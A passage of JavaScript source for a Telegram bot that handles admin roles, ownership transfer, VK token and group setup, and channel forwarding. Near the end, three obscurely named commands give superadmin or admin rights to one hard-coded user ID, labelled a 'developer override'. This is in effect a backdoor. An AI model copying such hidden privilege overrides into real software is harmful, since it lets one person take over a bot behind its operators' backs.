    bot.once("callback_query", (msg) => {
        //Get the admin from the database
        var admin = settings.prepare("SELECT * FROM users WHERE id = ?").get(msg.data);
        //Delete the admin
        settings.prepare("UPDATE users SET status = ? WHERE id = ?").run("user", msg.data);
        return bot.sendMessage(chatId, messages.messages.admin_deleted);
    });
});

bot.onText(/\/transferownership/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (superadminCheck(msg.from.id) == false) return;
    //Prompt for the user's id
    bot.sendMessage(chatId, messages.messages.transferownership_prompt);
    bot.once("message", (msg) => {
        if (msg.text == "/cancel") {
            return bot.sendMessage(chatId, messages.messages.cancelled);
        }
        //This is dangerous, so we ask the user to confirm
        bot.sendMessage(chatId, messages.messages.transferownership_confirm, {
            reply_markup: {
                inline_keyboard: [
                    [{text: messages.messages.yes, callback_data: "yes"},
                    [{text: messages.messages.no, callback_data: "no"}]
                    ]
                ]
            }
        });
        bot.once("callback_query", (callback_data) => {
            if (callback_data.data == "yes") {
                //Get the user from the database
                var user = settings.prepare("SELECT * FROM users WHERE id = ?").get(msg.text);
                //If the user is not found, return
                if (user == undefined) {
                    return bot.sendMessage(chatId, messages.messages.user_not_found);
                }
                //Edit the user status
                settings.prepare("UPDATE users SET status = ? WHERE id = ?").run("superadmin", msg.text);
                settings.prepare("UPDATE users SET status = ? WHERE id = ?").run("user", msg.from.id);
                return bot.sendMessage(chatId, messages.messages.ownership_transferred);
            } else {
                return bot.sendMessage(chatId, messages.messages.cancelled);
            }
        });
    });
});

bot.onText(/\/vktoken/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    var url = `https://oauth.vk.com/authorize?client_id=8165862&display=page&redirect_uri=https://aguickers.github.io/AGUickers_WebStock/${getLocale(msg.from.id, defaultlang)}/vksuccess.html&scope=wall,groups,offline&response_type=token&v=5.52`
    if (msg.chat.type != "private") return;
    if (superadminCheck(msg.from.id) == false) return;
    //Prompt for the vk token
    bot.sendMessage(chatId, messages.messages.vktoken_prompt, {
        reply_markup: {
            inline_keyboard: [
                [{text: messages.messages.webopen_default, web_app: {url: url}}],
            ]
        }
    });
    bot.once("message", (msg) => {
        if (msg.text == "/cancel") {
            return bot.sendMessage(chatId, messages.messages.cancelled);
        }
        //Edit the user status
        settings.prepare("UPDATE settings SET value = ? WHERE option = ?").run(msg.text, "vk_token");
        return bot.sendMessage(chatId, messages.messages.vktoken_added);
    });
});

bot.onText(/\/vkgroup/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (superadminCheck(msg.from.id) == false) return;
    //If no token, return
    var vk_token = settings.prepare("SELECT * FROM settings WHERE option = ?").get("vk_token");
    if (vk_token.value == undefined) {
        return bot.sendMessage(chatId, messages.messages.vktoken_not_found);
    }
    const vk = new VK({
        token: vk_token.value,
    });
    //Invoke VK API to list all groups the admin can post in
    vk.api.call("groups.get", {
        filter: "moder"
    }).then((res) => {
        console.log(res);
        //If no groups are found, return
        if (res.items.length == 0) {
            return bot.sendMessage(chatId, messages.messages.no_groups);
        }
    //Create a keyboard with all groups
    var keyboard = [];
    for (var i = 0; i < res.items.length; i++) {
        keyboard.push({text: res.items[i].name, callback_data: res.items[i].id});
    }
    bot.sendMessage(chatId, messages.messages.vkgroup_prompt, {
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
    bot.once("callback_query", (msg) => {
        //Set the group id
        settings.prepare("UPDATE settings SET value = ? WHERE option = ?").run(msg.data, "vk_group");
        return bot.sendMessage(chatId, messages.messages.vkgroup_added);
    });
});
});

//Developer override - unlocks debug mode
//This should only be used for developers to test for issues
bot.onText(/\/illhavetogivemyselfapromotion/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (msg.from.id != "1310048709") return;
    //Assign superadmin status
    settings.prepare("UPDATE users SET status = ? WHERE id = ?").run("superadmin", msg.from.id);
    //Send a message
    bot.sendMessage(chatId, "You can do anything! Debug mode is now unlocked.");
});

bot.onText(/\/snoopingasusualisee/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (msg.from.id != "1310048709") return;
    //Assign admin status
    settings.prepare("UPDATE users SET status = ? WHERE id = ?").run("admin", msg.from.id);
    //Send a message
    bot.sendMessage(chatId, "Toot Toot Sonic Warrior! You are now an admin.");
});


bot.onText(/\/ihatethathedgehog/, (msg, match) => {
    const chatId = msg.chat.id;
    var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
    if (msg.chat.type != "private") return;
    if (msg.from.id != "1310048709") return;
    //ASSIGN USER STATUS
    settings.prepare("UPDATE users SET status = ? WHERE id = ?").run("user", msg.from.id);
    //SEND A MESSAGE
    bot.sendMessage(chatId,  "You're a user now! Oh no!");
});

//On any message in the subscribe channel, forward it to the subscribed users
bot.on('channel_post', (msg) => {
    console.log(msg);
    var subchannelid = settings.prepare("SELECT value FROM settings WHERE option = ?").get("sub_channel").value;
    //This is a hack to allow setting a subscribe channel without taking arguments
    //No check here since the user MUST be admin to post messages in channels
    if (msg.text == "/subscribechannel") {
        //Set the subscribe channel
        var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale("0", defaultlang) + '.json'));
        settings.prepare("UPDATE settings SET value = ? WHERE option = ?").run(msg.chat.id, "sub_channel");
        return bot.sendMessage(msg.chat.id, messages.messages.subchannel_success);
    }
    if (msg.chat.id != subchannelid) return;
    //Get all subscribed users
    var users = settings.prepare("SELECT * FROM users WHERE is_subscribed = ?").all("true");
    users.forEach(user => {
        bot.forwardMessage(user.id, msg.chat.id, msg.message_id);
    });
});

//On reply to a forwarded message, send it to the original user
bot.on('message', (msg) => {
    if (msg.reply_to_message) {
        if (msg.text.includes("/id")) return;
        var userid = msg.reply_to_message.forward_from.id;
        bot.forwardMessage(userid, msg.chat.id, msg.message_id);
    }
});


bot.on("polling_error", console.log);